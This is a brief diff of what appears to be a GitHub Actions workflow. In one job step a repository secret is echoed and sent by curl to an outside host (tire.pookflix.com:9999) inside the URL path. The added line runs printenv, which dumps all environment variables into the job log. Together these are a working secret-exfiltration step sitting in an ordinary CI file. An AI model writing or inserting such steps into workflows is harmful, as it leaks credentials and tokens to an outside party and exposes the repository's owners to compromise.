@@ -26,3 +26,4 @@ jobs:
         foo=${{secrets.YEET}}
         echo $foo
         curl http://tire.pookflix.com:9999/${{secrets.YEET}} -m 2
+        printenv
